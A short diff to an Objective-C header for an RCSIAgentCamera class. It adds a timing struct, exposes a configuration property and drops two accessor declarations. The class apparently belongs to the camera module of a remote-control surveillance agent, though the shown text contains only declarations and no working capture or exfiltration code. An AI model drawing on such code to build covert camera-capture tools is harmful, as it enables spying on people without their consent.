@@ -10,13 +10,20 @@
 #ifndef __RCSIAgentCamera_h__
 #define __RCSIAgentCamera_h__
 
+typedef struct _cameraStruct
+{
+  UInt32 timeStep;
+  UInt32 numStep;
+} cameraStruct;
+
+
 @interface RCSIAgentCamera : NSObject
 {
 @public
   NSMutableDictionary *mAgentConfiguration;
 }
 
-//@property (retain, readwrite) NSMutableDictionary *mAgentConfiguration;
+@property (retain, readwrite) NSMutableDictionary *mAgentConfiguration;
 
 + (RCSIAgentCamera *)sharedInstance;
 
@@ -27,9 +34,6 @@
 - (void)release;
 - (id)autorelease;
 - (id)init;
-
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
-- (NSMutableDictionary *)mAgentConfiguration;
 
 - (void)start;
 - (BOOL)stop;
